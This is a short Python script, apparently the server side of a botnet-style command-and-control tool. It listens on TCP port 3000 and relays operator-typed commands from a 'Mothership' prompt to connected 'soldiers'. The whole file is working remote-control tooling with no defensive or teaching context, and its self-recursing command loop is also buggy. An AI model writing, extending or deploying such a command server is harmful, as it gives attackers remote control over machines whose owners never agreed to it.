import socket
import time
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(('192.168.167.207', 3000))
print("Listening on port: 3000")
s.listen(5)


while True:
    clientsocket, address = s.accept()
    print(f"Connection from {address} has been established!")
    time.sleep(3)

    def ms_command():
        try:
            print("Send a command from mothership to soldiers!")
            cmd = input("Mothership>")
            clientsocket.send(bytes(cmd, "utf-8"))
            print("Command send!")
            time.sleep(2)
            os.system('clear')

            return ms_command()
        except:
            print("Command not send! something went wrong.")
    ms_command()
